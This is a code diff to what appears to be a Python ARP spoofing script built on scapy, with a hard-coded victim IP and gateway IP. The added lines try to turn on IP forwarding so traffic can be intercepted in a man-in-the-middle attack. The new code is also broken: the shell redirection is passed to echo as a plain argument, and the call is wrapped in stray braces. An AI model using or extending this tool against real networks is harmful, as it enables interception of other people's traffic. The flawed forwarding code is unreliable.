@@ -9,6 +9,12 @@
 
 import scapy.all as scapy
 import time
+import subprocess
+
+def create_queue():
+    {
+        subprocess.call(["sudo", "echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
+    }
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -34,6 +40,8 @@ def restore(destination_ip,source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
+create_queue()
+time.sleep(5)
 sent_packets_count = 2
 target_ip ="192.168.1.5"
 gateway_ip ="192.168.1.1"
